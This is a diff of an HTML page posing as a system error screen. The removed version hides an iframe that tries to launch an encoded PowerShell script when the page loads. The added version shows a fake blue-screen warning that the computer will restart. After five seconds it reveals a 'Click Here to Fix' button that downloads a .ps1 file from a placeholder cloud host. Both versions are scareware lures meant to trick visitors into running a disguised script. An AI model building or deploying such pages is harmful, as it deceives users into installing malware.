@@ -1,29 +1,57 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Error Page</title>
-    <script>
-        // Function to execute PowerShell script
-        function executePowerShell() {
-            // Encoded PowerShell script
-            var encodedScript = "YOUR_BASE64_ENCODED_SCRIPT_HERE";
-
-            // Create a hidden iframe to execute the script
-            var iframe = document.createElement("iframe");
-            iframe.src = "powershell://" + encodedScript;
-            iframe.style.display = "none";
-            document.body.appendChild(iframe);
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Error</title>
+    <style>
+        body {
+            background-color: #0000AA;
+            color: white;
+            font-family: Consolas, monospace;
+            font-size: 22px;
+            text-align: center;
+            padding: 50px;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
         }
-
-        // Execute the script when the page loads
-        window.onload = function() {
-            executePowerShell();
-            alert("THIS IS A NEW error occurred. Please try again later.");  // Display error message
-        };
+        .error-code {
+            font-size: 40px;
+            font-weight: bold;
+        }
+        .message {
+            margin-top: 20px;
+        }
+        .loading {
+            margin-top: 40px;
+            font-size: 20px;
+        }
+        .download-button {
+            background-color: red;
+            color: white;
+            font-size: 20px;
+            padding: 10px 20px;
+            margin-top: 30px;
+            border: none;
+            cursor: pointer;
+        }
+    </style>
+    <script>
+        setTimeout(() => {
+            document.getElementById('dots').innerHTML = 'Restarting Now...';
+            document.getElementById('download-btn').style.display = 'block';
+        }, 5000);
     </script>
 </head>
 <body>
-    <h1>Error Page</h1>
-    <p>An error occurred. Please try again later.</p>
+    <div class="error-code">💀 SYSTEM ERROR 💀</div>
+    <div class="message">A critical error has occurred. Your computer will restart to prevent damage.</div>
+    <div class="loading">Restarting in <span id="dots">5 seconds...</span></div>
+    <a id="download-btn" href="https://your-cloud-storage.com/game2.ps1" download style="display: none;">
+        <button class="download-button">Click Here to Fix</button>
+    </a>
 </body>
 </html>
